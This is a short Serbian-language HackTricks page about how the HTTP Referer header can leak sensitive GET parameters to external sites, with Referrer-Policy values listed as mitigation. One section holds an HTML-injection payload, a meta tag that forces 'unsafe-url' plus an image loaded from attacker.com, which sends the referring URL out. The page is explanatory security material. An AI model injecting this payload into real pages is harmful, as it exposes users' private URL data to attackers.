<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Referrer zaglavlja i politika

Referrer je zaglavlje koje koriste pregledači da bi pokazali koja je bila prethodna posjećena stranica.

## Procurene osetljive informacije

Ako se u nekom trenutku unutar web stranice nalaze osetljive informacije u GET zahtevu, ako stranica sadrži linkove ka spoljnim izvorima ili napadač može da navede (socijalno inženjering) korisnika da poseti URL koji kontroliše napadač. Mogao bi da eksfiltrira osetljive informacije unutar poslednjeg GET zahteva.

## Otklanjanje

Možete naterati pregledač da prati **Referrer-policy** koji bi mogao **izbeći** slanje osetljivih informacija drugim web aplikacijama:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Protivmere

Možete poništiti ovaj pravilo korišćenjem HTML meta oznake (napadač mora iskoristiti HTML ubacivanje):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Odbrana

Nikada nemojte stavljati bilo kakve osetljive podatke unutar GET parametara ili putanja u URL-u.
